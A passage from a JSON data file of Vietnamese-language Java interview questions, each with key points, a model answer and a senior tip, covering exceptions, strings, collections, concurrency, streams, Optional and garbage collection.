      "modelAnswer": "1. **Bộ nhớ Stack vs Heap**:\n   - **Stack Memory**: Được cấp phát cho từng luồng (Thread). Lưu các khung lời gọi hàm (Stack Frames), các biến cục bộ kiểu nguyên thủy (`int`, `boolean`...) và các **con trỏ tham chiếu** đến đối tượng. Stack có tốc độ truy xuất cực nhanh và tự động thu hồi ô nhớ ngay khi method kết thúc. Đệ quy vô tận sẽ gây lỗi **`StackOverflowError`**.\n   - **Heap Memory**: Vùng nhớ dùng chung cho toàn bộ ứng dụng. Lưu trữ toàn bộ các **Đối tượng (Objects)** được tạo bằng từ khóa `new` và mảng. Được quản lý tự động bởi Garbage Collector (GC). Cạn kiệt bộ nhớ Heap sẽ ném lỗi **`OutOfMemoryError`**.\n2. **Cơ chế truyền tham số trong Java**:\n   - **JAVA 100% LÀ PASS-BY-VALUE!** Không có Pass-by-reference.\n   - Khi truyền primitive (ví dụ `int x = 5;`), Java sao chép nguyên giá trị 5 vào method.\n   - Khi truyền Object (ví dụ `Person p`), Java sao chép **giá trị của biến tham chiếu** (tức là sao chép con trỏ địa chỉ ô nhớ). Vì cả hai con trỏ cùng trỏ vào 1 đối tượng trên Heap, nên thao tác `p.setName(\"Nam\")` sẽ làm thay đổi đối tượng thật. Tuy nhiên, nếu bên trong hàm viết `p = new Person(\"Lan\")`, thì chỉ có biến bản sao bị trỏ đi chỗ khác, biến `p` ban đầu bên ngoài hàm hoàn toàn KHÔNG THAY ĐỔI!",
      "seniorTip": "Luôn khẳng định chắc nịch 'Java is strictly pass-by-value' - đây là câu cửa miệng kiểm tra xem ứng viên có bị nhầm lẫn với C++ hay không."
    },
    {
      "id": "audit_6",
      "domain": "Java Core",
      "question": "Phân biệt Checked Exception và Unchecked Exception? Khối finally có luôn luôn được thực thi không?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Checked Exception: Kế thừa từ Exception (trừ RuntimeException). Compiler bắt buộc phải try-catch hoặc throws (ví dụ IOException, SQLException).",
        "Unchecked Exception: Kế thừa từ RuntimeException. Xảy ra do lỗi logic lập trình (NullPointerException, ArrayIndexOutOfBoundsException), compiler không ép xử lý.",
        "finally LUÔN CHẠY trừ 2 trường hợp: System.exit(0) hoặc JVM crash / mất nguồn.",
        "Nếu try return 1, finally return 2 -> hàm trả về 2 (finally ghi đè return)."
      ],
      "modelAnswer": "1. **Checked vs Unchecked Exception**:\n   - **Checked Exception**: Là các lớp kế thừa từ `java.lang.Exception` (ngoại trừ nhánh `RuntimeException`). Đây là các tình huống ngoại lệ ngoài tầm kiểm soát của code (file không tồn tại, đứt kết nối DB...). Trình biên dịch (javac) **bắt buộc lập trình viên phải xử lý** bằng `try-catch` hoặc khai báo `throws` ở chữ ký method (ví dụ `IOException`, `SQLException`).\n   - **Unchecked Exception**: Là các lớp kế thừa từ `java.lang.RuntimeException` hoặc `Error`. Thường xuất phát từ lỗi logic của lập trình viên (`NullPointerException`, `ArrayIndexOutOfBoundsException`, `ArithmeticException`). Compiler không bắt buộc phải try-catch.\n2. **Khối `finally` có luôn luôn chạy không?**\n   - Về nguyên tắc chuẩn: `finally` **LUÔN LUÔN ĐƯỢC THỰC THI**, kể cả khi trong khối `try` hoặc `catch` có lệnh `return`.\n   - **Trường hợp duy nhất `finally` không chạy**: Khi chương trình chủ động gọi **`System.exit(status)`** làm JVM kết thúc ngay lập tức, hoặc khi máy chủ bị mất nguồn điện / tiến trình OS bị kill cưỡng bức.\n   - Lưu ý bẫy thi: Nếu `try` trả về `1` nhưng `finally` có câu lệnh `return 2;`, thì giá trị cuối cùng trả về sẽ là `2` vì finally sẽ ghi đè toàn bộ luồng điều khiển trước đó.",
      "seniorTip": "Nêu thêm việc không nên viết lệnh return trong finally vì nó sẽ nuốt chửng cả exception đang văng ra (anti-pattern)."
    },
    {
      "id": "audit_7",
      "domain": "Java Core",
      "question": "Phân biệt final, finally và finalize() trong Java?",
      "timeLimitSeconds": 75,
      "keyPoints": [
        "final: Từ khóa modifier (biến không đổi giá trị, method không thể override, class không thể kế thừa).",
        "finally: Khối lệnh đi kèm try-catch để dọn dẹp tài nguyên (close stream, connection).",
        "finalize(): Phương thức của class Object, được GC gọi trước khi thu hồi đối tượng (đã bị deprecated từ Java 9)."
      ],
      "modelAnswer": "Đây là 3 khái niệm hoàn toàn khác nhau về bản chất:\n1. **`final` (Từ khóa định nghĩa tính bất biến)**:\n   - Áp dụng cho biến: Biến trở thành hằng số, chỉ được gán giá trị một lần duy nhất.\n   - Áp dụng cho phương thức: Lớp con không thể Override phương thức này.\n   - Áp dụng cho lớp (class): Lớp này không thể bị kế thừa (ví dụ `String`, `Integer` là final class).\n2. **`finally` (Khối dọn dẹp tài nguyên)**:\n   - Là một khối lệnh nằm trong cấu trúc xử lý ngoại lệ `try-catch-finally`.\n   - Luôn luôn được thực thi để đóng các tài nguyên mở như `InputStream`, `Connection`, `PreparedStatement` nhằm chống thất thoát bộ nhớ (resource leak).\n3. **`finalize()` (Phương thức dọn dẹp của Garbage Collector)**:\n   - Là phương thức của lớp `java.lang.Object`.\n   - Được trình thu gom rác (GC) gọi một lần duy nhất trước khi tiêu hủy đối tượng để giải phóng tài nguyên gốc (native resources). Phương thức này không đảm bảo thời điểm chạy và đã bị đánh dấu **Deprecated từ Java 9** (thay thế bằng `AutoCloseable` và `try-with-resources`).",
      "seniorTip": "Đây là câu hỏi phân loại ứng viên cơ bản nhưng rất hay được hỏi ở vòng Audit khởi động để đo khả năng phân tách khái niệm."
    },
    {
      "id": "audit_8",
      "domain": "Java Core",
      "question": "So sánh String, StringBuffer và StringBuilder? Tại sao String trong Java lại được thiết kế bất biến (Immutable)?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "String: Bất biến (Immutable), mỗi lần sửa tạo object mới. Thích hợp lưu trữ dữ liệu tĩnh (tài khoản, URL).",
        "StringBuffer: Khả biến (Mutable), thread-safe (các phương thức đều synchronized), hiệu năng chậm hơn StringBuilder.",
        "StringBuilder: Khả biến (Mutable), non-synchronized, tốc độ cao nhất, khuyến nghị dùng cho xử lý chuỗi đơn luồng.",
        "Tại sao String bất biến: (1) An toàn String Pool; (2) An toàn đa luồng (Thread-safe); (3) An toàn bảo mật (Security); (4) Tối ưu Caching HashCode."
      ],
      "modelAnswer": "1. **So sánh 3 lớp xử lý chuỗi**:\n   - **`String`**: Bất biến (**Immutable**). Một khi đã tạo ra trên bộ nhớ thì không thể sửa đổi nội dung. Mọi thao tác nối chuỗi `s += \"a\"` thực chất là tạo ra một đối tượng String hoàn toàn mới trên Heap, gây tốn bộ nhớ nếu lặp lại nhiều lần trong vòng for.\n   - **`StringBuffer`**: Khả biến (**Mutable**). Có thể thay đổi trực tiếp trên mảng char nội bộ thông qua `append()`. Điểm đặc trưng là **Thread-safe** vì hầu hết các phương thức đều có từ khóa `synchronized`, do đó tốc độ chậm hơn.\n   - **`StringBuilder`** (Java 5): Giống hệt `StringBuffer` về mặt API nhưng **KHÔNG synchronized** (không thread-safe). Bù lại, tốc độ xử lý là nhanh nhất. Khuyến nghị sử dụng trong 95% trường hợp đơn luồng.\n2. **Lý do Java thiết kế String bất biến**:\n   - **String Constant Pool**: Nếu String có thể sửa, việc thay đổi ở một biến sẽ làm thay đổi giá trị của tất cả các biến khác đang dùng chung chuỗi đó trong Pool.\n   - **Bảo mật (Security)**: Chuỗi String thường dùng chứa username, password, địa chỉ IP mạng, kết nối DB. Nếu nó khả biến, một tiến trình khác có thể lén thay đổi nội dung sau khi đã vượt qua vòng kiểm duyệt.\n   - **Thread-safe**: Do không thể sửa đổi, đối tượng String có thể được chia sẻ tự do giữa hàng trăm luồng mà không lo xung đột dữ liệu.\n   - **Caching HashCode**: Vì nội dung không đổi nên mã `hashCode()` của String chỉ cần tính toán 1 lần duy nhất rồi cache lại, giúp các cấu trúc như `HashMap`, `HashSet` tra cứu cực kỳ nhanh.",
      "seniorTip": "Nêu 4 lý do String bất biến là câu trả lời chuẩn chỉ của một Senior Java Architect."
    },
    {
      "id": "audit_9",
      "domain": "Java Core",
      "question": "So sánh ArrayList và LinkedList? Độ phức tạp thuật toán Big-O khi thao tác thêm, xóa, tìm kiếm?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "ArrayList: Dựa trên mảng động (Dynamic Array). Truy cập ngẫu nhiên theo index O(1). Thêm/xóa ở giữa O(N) vì phải dịch mảng.",
        "LinkedList: Dựa trên danh sách liên kết đôi (Doubly-linked list). Truy cập theo index O(N) vì phải duyệt từ đầu/cuối.",
        "Thêm/xóa ở đầu/cuối: LinkedList là O(1). ArrayList thêm ở cuối là O(1) amortized, nhưng resize mảng tốn O(N).",
        "Chi phí bộ nhớ: LinkedList tốn thêm RAM để lưu 2 con trỏ prev/next cho mỗi Node."
      ],
      "modelAnswer": "1. **Cấu trúc bên dưới**:\n   - **`ArrayList`**: Quản lý dữ liệu bằng một **Mảng động (Resizable Array)** liên tục trên bộ nhớ.\n   - **`LinkedList`**: Quản lý dữ liệu bằng các **Node liên kết đôi (Doubly-Linked List)** nằm rải rác trên Heap, mỗi Node chứa dữ liệu và hai con trỏ trỏ tới `prev` và `next`.\n2. **Độ phức tạp thuật toán (Big-O)**:\n   - **Tìm kiếm theo chỉ số `get(index)`**:\n     - `ArrayList` đạt **$O(1)$** vì mảng có địa chỉ tính toán trực tiếp `base_address + index * size`.\n     - `LinkedList` mất **$O(N)$** (tối ưu duyệt từ đầu hoặc cuối là $O(N/2)$) vì phải nhảy qua từng con trỏ.\n   - **Thêm/Xóa phần tử (`add`/`remove`)**:\n     - Ở đầu danh sách: `LinkedList` là **$O(1)$**, `ArrayList` là **$O(N)$** (phải dịch toàn bộ mảng sang phải).\n     - Ở giữa danh sách: Cả hai đều mất $O(N)$ (ArrayList mất $O(N)$ dịch mảng, LinkedList mất $O(N)$ để tìm vị trí rồi $O(1)$ đổi con trỏ).\n     - Ở cuối danh sách: `ArrayList` thường là **$O(1)$ amortized** (trừ lúc resize mảng đầy phải copy sang mảng mới gấp 1.5 lần), `LinkedList` là **$O(1)$**.\n3. **Khuyến nghị sử dụng**: Trong thực tế lập trình, **`ArrayList` được ưu tiên dùng trong 90% trường hợp** vì tận dụng được bộ nhớ đệm CPU Cache locality và tiết kiệm RAM hơn (LinkedList tốn thêm bộ nhớ cho 2 con trỏ ở mỗi phần tử).",
      "seniorTip": "Nhấn mạnh yếu tố CPU Cache locality của ArrayList để ghi điểm tuyệt đối về phần cứng và cấu trúc máy tính."
    },
    {
      "id": "audit_10",
      "domain": "Java Core",
      "question": "Phân biệt Comparable và Comparator trong Java? Khi nào sử dụng interface nào?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Comparable: Nằm trong package java.lang. Định nghĩa thứ tự tự nhiên (Natural ordering) bên trong chính class đó thông qua compareTo(T o).",
        "Comparator: Nằm trong package java.util. Định nghĩa chiến lược sắp xếp tùy biến bên ngoài thông qua compare(T o1, T o2).",
        "Comparable can thiệp sửa đổi mã nguồn class; Comparator không cần can thiệp class gốc.",
        "Một class chỉ có 1 Comparable duy nhất, nhưng có thể có vô số Comparator khác nhau (sắp theo tên, theo tuổi, theo giá...)."
      ],
      "modelAnswer": "Khác biệt giữa `Comparable` và `Comparator`:\n1. **Vị trí và phương thức**:\n   - **`Comparable<T>`** thuộc gói `java.lang`. Có 1 phương thức duy nhất: **`int compareTo(T o)`**. Class cần so sánh phải tự implements interface này (can thiệp trực tiếp mã nguồn class).\n   - **`Comparator<T>`** thuộc gói `java.util`. Có phương thức cốt lõi: **`int compare(T o1, T o2)`**. Được viết thành một lớp riêng biệt hoặc viết dưới dạng Anonymous class / Lambda expression mà không cần chạm vào class gốc.\n2. **Mục đích sử dụng**:\n   - **`Comparable`** dùng để định nghĩa **Thứ tự tự nhiên (Natural Ordering)** của đối tượng (ví dụ sinh viên thì mặc định sắp xếp theo mã sinh viên).\n   - **`Comparator`** dùng khi ta muốn sắp xếp theo **Nhiều tiêu chí linh hoạt khác nhau** (ví dụ lúc cần xếp theo điểm số, lúc cần xếp theo tên A-Z, lúc xếp theo ngày sinh) hoặc khi class đó thuộc thư viện bên ngoài mà ta không có quyền sửa code.\n3. **Giá trị trả về**:\n   - Trả về số âm: Đối tượng 1 đứng trước đối tượng 2.\n   - Trả về `0`: Hai đối tượng tương đương nhau về thứ tự.\n   - Trả về số dương: Đối tượng 1 đứng sau đối tượng 2.",
      "seniorTip": "Có thể viết nhanh ví dụ Lambda của Comparator trong Java 8: list.sort(Comparator.comparing(Student::getAge).reversed());"
    },
    {
      "id": "audit_11",
      "domain": "Java Core",
      "question": "Trong Multithreading, gọi phương thức start() khác gì gọi trực tiếp run()? Từ khóa synchronized hoạt động dựa trên cơ chế nào?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "start(): Tạo ra một hệ điều hành Thread (OS Thread) mới, cấp phát call stack riêng, rồi JVM mới gọi hàm run() trên luồng mới đó.",
        "run(): Chỉ là một phương thức bình thường, gọi trực tiếp sẽ chạy tuần tự trên luồng hiện tại (main thread), không có đa luồng!",
        "synchronized hoạt động dựa trên cơ chế Khóa đối tượng (Monitor Lock / Intrinsic Lock).",
        "Mỗi object trong Java có 1 monitor lock. Luồng nào chiếm được lock mới được vào khối lệnh synchronized, các luồng khác rơi vào trạng thái BLOCKED."
      ],
      "modelAnswer": "1. **`start()` vs `run()`**:\n   - Khi gọi **`thread.start()`**: JVM sẽ yêu cầu Hệ điều hành khởi tạo một **Thread mới thực sự**, cấp phát một vùng nhớ Stack riêng biệt cho luồng đó. Sau đó, hệ thống sẽ tự động gọi phương thức `run()` trên luồng mới này một cách bất đồng bộ (concurrently).\n   - Khi gọi trực tiếp **`thread.run()`**: Nó chỉ đơn thuần là một lời gọi phương thức thông thường trên **chính luồng hiện tại (Main Thread)**. Không có luồng mới nào được sinh ra, chương trình vẫn chạy tuần tự đồng bộ từng dòng.\n2. **Cơ chế hoạt động của `synchronized`**:\n   - Từ khóa `synchronized` trong Java hoạt động dựa trên cơ chế **Monitor Lock (hay Intrinsic Lock)**.\n   - Trong Java, mọi Đối tượng (`Object`) đều sở hữu một ổ khóa nội tại gắn liền với nó.\n   - Khi một luồng bước vào phương thức hoặc khối lệnh `synchronized(this)`, nó phải **chiếm giữ (acquire) Monitor Lock** của đối tượng đó. Trong khi luồng này đang giữ khóa, bất kỳ luồng nào khác cố gắng truy cập vào các khối lệnh dùng chung ổ khóa đó sẽ bị hệ thống chặn lại và chuyển sang trạng thái **`BLOCKED`**.\n   - Khi luồng hoàn tất hoặc ném exception, Monitor Lock được tự động giải phóng (release) cho luồng tiếp theo vào tranh chấp.",
      "seniorTip": "Nếu synchronized đặt ở static method, ổ khóa sẽ là Class Object (MyClass.class) chứ không phải instance."
    },
    {
      "id": "audit_12",
      "domain": "Java Core",
      "question": "Deadlock (Bế tắc) trong đa luồng là gì? Nêu 4 điều kiện sinh ra Deadlock và phương pháp giải quyết?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Deadlock xảy ra khi 2 hoặc nhiều luồng cùng chờ đợi tài nguyên mà luồng kia đang nắm giữ, không ai chịu nhường -> đóng băng vĩnh viễn.",
        "Ví dụ kinh điển: Thread 1 giữ Lock A chờ Lock B; Thread 2 giữ Lock B chờ Lock A.",
        "4 điều kiện Coffman: Mutual Exclusion, Hold and Wait, No Preemption, Circular Wait.",
        "Giải pháp: Phá vỡ Circular Wait bằng cách luôn chiếm các Lock theo một THỨ TỰ CỐ ĐỊNH (Lock Ordering) hoặc dùng ReentrantLock.tryLock()."
      ],
      "modelAnswer": "1. **Khái niệm Deadlock**:\n   - Deadlock là hiện tượng bế tắc trong đó hai hoặc nhiều tiến trình/luồng bị treo vĩnh viễn do **luồng này đang giữ tài nguyên mà luồng kia cần, đồng thời đang chờ tài nguyên mà luồng kia đang nắm giữ**.\n   - Ví dụ: Luồng 1 giữ ổ khóa A, muốn lấy ổ khóa B. Cùng lúc đó Luồng 2 đang giữ ổ khóa B và muốn lấy ổ khóa A. Cả hai luồng chờ nhau mãi mãi.\n2. **4 Điều kiện sinh ra Deadlock (Coffman Conditions)**:\n   - *Mutual Exclusion*: Tài nguyên chỉ cho phép 1 luồng truy cập tại 1 thời điểm.\n   - *Hold and Wait*: Luồng đang giữ ít nhất 1 tài nguyên và đang chờ tài nguyên khác.\n   - *No Preemption*: Không thể cưỡng bức giật tài nguyên khỏi tay luồng đang giữ.\n   - *Circular Wait*: Tồn tại một chuỗi vòng tròn các luồng chờ đợi lẫn nhau ($T_1 \\to T_2 \\to T_3 \\to T_1$).\n3. **Giải pháp phòng chống Deadlock**:\n   - **Chiến lược sắp xếp thứ tự khóa (Lock Ordering)**: Luôn đảm bảo tất cả các luồng phải chiếm khóa theo cùng một thứ tự duy nhất (ví dụ luôn chiếm A trước rồi mới chiếm B). Điều này phá vỡ hoàn toàn điều kiện *Circular Wait*.\n   - **Sử dụng `tryLock(timeout)`** của `ReentrantLock`: Nếu sau một khoảng thời gian không lấy được khóa thì chủ động nhả khóa đang cầm và thử lại sau (tránh chờ đợi vô tận).",
      "seniorTip": "Nêu bài toán 'Dining Philosophers' (Triết gia ăn tối) như ví dụ minh họa trực quan."
    },
    {
      "id": "audit_13",
      "domain": "Java 8+ Modern",
      "question": "Functional Interface là gì? Phân biệt 4 Functional Interface cốt lõi: Predicate, Function, Consumer, Supplier?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Functional Interface: Interface chỉ có DUY NHẤT 1 abstract method (có thể có nhiều default/static methods). Đánh dấu bằng @FunctionalInterface.",
        "Predicate<T>: Nhận 1 tham số T, trả về boolean (hàm test).",
        "Function<T, R>: Nhận T, trả về kết quả R (hàm biến đổi/mapping).",
        "Consumer<T>: Nhận T, không trả về gì (void - hàm tiêu thụ/in ấn).",
        "Supplier<T>: Không nhận tham số, cung cấp ra một đối tượng T (hàm sinh/cung cấp)."
      ],
      "modelAnswer": "1. **Định nghĩa Functional Interface**:\n   - Là interface chỉ chứa **duy nhất một phương thức trừu tượng (Single Abstract Method - SAM)**. Nó có thể chứa thêm các phương thức `default` hoặc `static`.\n   - Được chú thích bằng `@FunctionalInterface` để compiler kiểm tra tính hợp lệ. Đây là nền tảng cốt lõi cho biểu thức Lambda trong Java 8.\n2. **4 Functional Interface cơ bản trong gói `java.util.function`**:\n   - **`Predicate<T>`**: Phương thức `boolean test(T t)`. Dùng để kiểm tra điều kiện (lọc). Ví dụ: `p -> p.getAge() > 18`.\n   - **`Function<T, R>`**: Phương thức `R apply(T t)`. Nhận vào một đối tượng kiểu T và biến đổi trả về đối tượng kiểu R. Ví dụ: `user -> user.getName()`.\n   - **`Consumer<T>`**: Phương thức `void accept(T t)`. Nhận vào tham số và thực hiện hành động (in ra màn hình, lưu DB), không có giá trị trả về. Ví dụ: `item -> System.out.println(item)`.\n   - **`Supplier<T>`**: Phương thức `T get()`. Không nhận tham số đầu vào nào, nhưng tự sinh ra hoặc cung cấp một đối tượng kiểu T (ví dụ cung cấp giá trị mặc định, tạo kết nối).",
      "seniorTip": "Liên hệ ngay với Stream API: filter dùng Predicate, map dùng Function, forEach dùng Consumer."
    },
    {
      "id": "audit_14",
      "domain": "Java 8+ Modern",
      "question": "Stream API trong Java 8 là gì? Phân biệt Intermediate Operations và Terminal Operations? Nêu tính chất Lazy Evaluation?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Stream API dùng để xử lý tập hợp dữ liệu theo phong cách Declarative (hàm chức năng) thay vì vòng lặp for truyền thống.",
        "Intermediate Operations: Trả về một Stream mới (filter, map, sorted, distinct). Có tính chất LAZY (chưa thực thi ngay).",
        "Terminal Operations: Thực thi luồng xử lý và đóng Stream, trả về kết quả cụ thể hoặc void (collect, forEach, count, reduce).",
        "Lazy Evaluation: Các bước trung gian chỉ được kích hoạt khi có một Terminal Operation được gọi."
      ],
      "modelAnswer": "1. **Bản chất Stream API**:\n   - Stream không phải là một cấu trúc dữ liệu lưu trữ phần tử. Nó là một **dòng chảy dữ liệu (Pipeline)** cho phép thao tác biến đổi, lọc, tính toán trên các Collection một cách khai báo (Declarative programming).\n2. **Phân biệt Intermediate vs Terminal Operations**:\n   - **Intermediate Operations (Thao tác trung gian)**: Nhận vào Stream và trả về một Stream mới. Ví dụ: `filter()`, `map()`, `sorted()`, `distinct()`, `limit()`. Chúng có thể ghép nối liên tiếp thành chuỗi.\n   - **Terminal Operations (Thao tác kết thúc)**: Đóng dòng Stream lại và xuất ra kết quả cuối cùng (trả về giá trị cụ thể hoặc void). Ví dụ: `collect(Collectors.toList())`, `forEach()`, `count()`, `reduce()`, `anyMatch()`. Sau khi gọi Terminal Operation, Stream không thể tái sử dụng.\n3. **Cơ chế Lazy Evaluation (Thực thi lười biếng)**:\n   - Các thao tác trung gian **hoàn toàn chưa chạy** khi ta gọi chúng. Chúng chỉ được biên dịch thành một kế hoạch xử lý. Chỉ đến khi Terminal Operation xuất hiện, toàn bộ pipeline mới bắt đầu kéo dữ liệu qua và thực thi trong một lượt duyệt duy nhất, giúp tối ưu hiệu năng vượt trội.",
      "seniorTip": "Nêu thêm Stream chỉ duyệt được 1 lần duy nhất (nếu duyệt lần 2 sẽ văng IllegalStateException)."
    },
    {
      "id": "audit_15",
      "domain": "Java 8+ Modern",
      "question": "Lớp Optional trong Java 8 dùng để làm gì? Nêu các best practices để tránh anti-pattern khi sử dụng Optional?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Optional là một container object dùng để bao bọc một giá trị có thể null hoặc không null, nhằm chống NullPointerException.",
        "Anti-pattern phổ biến: Dùng if (opt.isPresent()) { opt.get(); } -> chẳng khác gì kiểm tra if (x != null).",
        "Best practice: Dùng orElse(), orElseGet(), orElseThrow(), map(), ifPresent().",
        "Không dùng Optional làm thuộc tính class (field) hoặc tham số hàm vì nó không implements Serializable."
      ],
      "modelAnswer": "1. **Mục đích của `Optional<T>`**:\n   - Được giới thiệu từ Java 8 để giải quyết lỗi ám ảnh số 1 của lập trình viên: **`NullPointerException` (NPE)**.\n   - Nó đóng vai trò như một chiếc hộp bao bọc: có thể chứa giá trị hoặc rỗng (`Optional.empty()`). Nó buộc người gọi hàm phải đối mặt và xử lý trường hợp không có dữ liệu một cách minh bạch.\n2. **Các Best Practices khi sử dụng**:\n   - **Tránh dùng `.get()` trực tiếp**: Nếu gọi `opt.get()` khi rỗng, nó sẽ ném `NoSuchElementException`. Cũng không nên dùng `if(opt.isPresent()) opt.get();` vì cú pháp này rườm rà như kiểm tra null truyền thống.\n   - **Sử dụng `.orElse(defaultValue)`** hoặc **`.orElseGet(() -> computeValue())`** để cấp giá trị thay thế an toàn.\n   - **Sử dụng `.orElseThrow(() -> new EntityNotFoundException(\"...\"))`** khi bắt buộc phải có dữ liệu trong API Service.\n   - **Không dùng `Optional` làm Field của Entity**: Vì class `Optional` không implements `Serializable`, sẽ gây lỗi khi serialize hoặc dùng với Hibernate.\n   - **Không dùng Optional làm tham số đầu vào của method**: Chỉ nên dùng làm kiểu trả về của method.",
      "seniorTip": "Phân biệt orElse (luôn chạy hàm bên trong) và orElseGet (chỉ chạy lambda khi giá trị thực sự null)."
    },
    {
      "id": "audit_16",
      "domain": "Java 8+ Modern",
      "question": "Default method và Static method trong Interface xuất hiện từ Java 8 nhằm mục đích gì? Giải quyết Diamond Problem thế nào?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Mục đích: Cho phép thêm method mới vào Interface mà không làm gãy (break) code của các class cũ đang implement interface đó (Backward Compatibility).",
        "Giúp Collections tương thích với Stream API (thêm hàm stream(), forEach() vào Collection).",
        "Diamond Problem: Khi một class implements 2 interface có cùng tên default method -> Compile Error!",
        "Cách giải quyết: Class con bắt buộc phải override lại method đó và chỉ định rõ muốn gọi của ai: InterfaceA.super.doWork();"
      ],
      "modelAnswer": "1. **Lý do ra đời của Default Method**:\n   - Trước Java 8, nếu thêm một method trừu tượng mới vào Interface, toàn bộ các class trong dự án đang implements interface đó sẽ bị **Compile Error** hàng loạt vì chưa override.\n   - Để tích hợp Stream API vào Collections có sẵn (ví dụ thêm method `forEach()`, `stream()` vào interface `Collection`), các kỹ sư Java đã phát minh ra **`default method`**: cho phép viết sẵn code hiện thực mặc định ngay trong interface.\n2. **Xử lý xung đột Đa kế thừa (Diamond Problem)**:\n   - Nếu `Class C` implements cả `Interface A` và `Interface B`, mà cả 2 interface này đều có phương thức `default void print()`, trình biên dịch sẽ báo lỗi xung đột: **Duplicate default methods**.\n   - **Cách giải quyết**: Class C bắt buộc phải Override phương thức `print()`. Trong hàm này, C có thể tự viết logic riêng, hoặc chỉ định rõ muốn gọi theo cha nào bằng cú pháp: **`A.super.print();`** hoặc **`B.super.print();`**.",
      "seniorTip": "Nêu thêm quy tắc 'Classes win over interfaces': Nếu class cha có method giống default method của interface, Java luôn ưu tiên chọn method của class cha."
    },
    {
      "id": "audit_17",
      "domain": "Java 8+ Modern",
      "question": "Trình dọn rác tự động (Garbage Collector - GC) trong JVM hoạt động như thế nào? Phân biệt Young Generation, Old Generation và Metaspace?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "GC tự động phát hiện và thu hồi các đối tượng trên Heap không còn được tham chiếu (Unreachable objects) bởi GC Roots.",
        "Heap chia thành 2 vùng chính: Young Generation (Eden, Survivor S0, S1) và Old/Tenured Generation.",
        "Minor GC dọn dẹp Young Gen; Major/Full GC dọn dẹp Old Gen (dừng ứng dụng - Stop The World).",
        "Metaspace (từ Java 8 thay thế PermGen) lưu trữ metadata của Class, nằm ngoài Native Memory chứ không nằm trong Heap."
      ],
      "modelAnswer": "1. **Nguyên lý của Garbage Collector**:\n   - GC tìm kiếm các đối tượng không còn khả năng tiếp cận (**Unreachable**) từ các gốc GC Roots (luồng đang chạy, biến static, biến local trên stack frame).\n2. **Phân vùng bộ nhớ Heap theo thế hệ (Generational Heap)**:\n   - **Young Generation**: Nơi các đối tượng mới sinh ra bằng từ khóa `new`. Gồm phân vùng **Eden** và 2 phân vùng **Survivor (S0, S1)**. Khi Eden đầy, quá trình **Minor GC** diễn ra, dọn dẹp các đối tượng ngắn hạn. Những đối tượng còn sống sót được chuyển sang Survivor và tăng độ tuổi (tenuring threshold, mặc định 15).\n   - **Old Generation (Tenured)**: Chứa các đối tượng sống lâu dài qua nhiều đợt Minor GC (ví dụ Singleton, Cache, Connection Pool). Khi vùng này đầy, quá trình **Major GC (hay Full GC)** sẽ được kích hoạt. Full GC sẽ làm dừng mọi luồng của ứng dụng (**Stop-the-World**), gây giật lag hệ thống.\n3. **Metaspace (Java 8+)**:\n   - Thay thế cho vùng `PermGen` cũ. Dùng để lưu trữ cấu trúc Class, Method metadata. Nằm trên **Native Memory của OS** nên có thể tự động co giãn theo dung lượng RAM máy chủ, tránh lỗi `java.lang.OutOfMemoryError: PermGen space`.",
      "seniorTip": "Nhắc tới các thuật toán GC hiện đại như G1GC (mặc định từ Java 9) hoặc ZGC để thể hiện tầm hiểu biết của Senior."
    },
    {
      "id": "audit_18",
      "domain": "Java 8+ Modern",
      "question": "ConcurrentModificationException là gì? Phân biệt Fail-Fast Iterator và Fail-Safe Iterator?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "ConcurrentModificationException xảy ra khi một luồng đang duyệt Collection mà cấu trúc Collection bị thay đổi (thêm/xóa) không qua Iterator.",
        "Fail-Fast (ArrayList, HashMap, HashSet): Kiểm tra biến modCount. Nếu phát hiện thay đổi trong lúc duyệt sẽ lập tức ném exception.",
        "Fail-Safe (CopyOnWriteArrayList, ConcurrentHashMap): Duyệt trên một bản sao (clone) của dữ liệu, không văng lỗi khi Collection gốc bị sửa đổi."
      ],
      "modelAnswer": "1. **Nguyên nhân sinh ra `ConcurrentModificationException`**:\n   - Xảy ra khi ta dùng vòng lặp `for-each` hoặc `Iterator` để duyệt qua một Collection (như `ArrayList`), nhưng bên trong thân vòng lặp lại gọi trực tiếp lệnh `list.remove()` hoặc `list.add()`.\n2. **Cơ chế Fail-Fast Iterator**:\n   - Các collection truyền thống (`ArrayList`, `HashMap`, `HashSet`) sử dụng cơ chế **Fail-Fast**.\n   - Bên trong chúng có một biến cờ đếm gọi là **`modCount`** (số lần cấu trúc bị thay đổi). Khi Iterator được tạo ra, nó ghi nhớ `expectedModCount = modCount`.\n   - Ở mỗi bước lặp, nó kiểm tra nếu `modCount != expectedModCount`, chứng tỏ có ai đó vừa thêm/xóa phần tử lén lút $\\to$ Iterator lập tức văng ngoại lệ **`ConcurrentModificationException`** để tránh sai lệch dữ liệu.\n   - **Cách xóa đúng**: Phải dùng phương thức **`iterator.remove()`** thay vì `list.remove()`.\n3. **Cơ chế Fail-Safe (hay Fail-Weak) Iterator**:\n   - Được dùng trong các collection đồng thời thuộc gói `java.util.concurrent` (như `CopyOnWriteArrayList`, `ConcurrentHashMap`).\n   - Chúng duyệt trên một **bản sao dữ liệu (snapshot clone)** tại thời điểm tạo Iterator. Do đó, việc thêm/xóa trên mảng gốc sẽ không gây ra lỗi.",
      "seniorTip": "Câu hỏi này rất hay đi kèm bài toán: 'Làm thế nào để xóa một phần tử khỏi danh sách khi đang chạy vòng lặp?'"
    },
    {
      "id": "audit_19",
      "domain": "Java Core",
      "question": "Shallow Copy và Deep Copy khác nhau như thế nào? Làm thế nào để tạo một Deep Copy trong Java?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Shallow Copy (Sao chép nông): Copy các giá trị nguyên thủy, nhưng các biến đối tượng tham chiếu chỉ copy con trỏ (cả 2 object cùng trỏ chung vào 1 đối tượng con).",
        "Deep Copy (Sao chép sâu): Copy độc lập hoàn toàn, tạo mới cả các đối tượng con bên trong.",
        "Sửa đổi đối tượng con ở Shallow Copy sẽ làm đối tượng kia bị đổi theo; Deep Copy thì độc lập.",
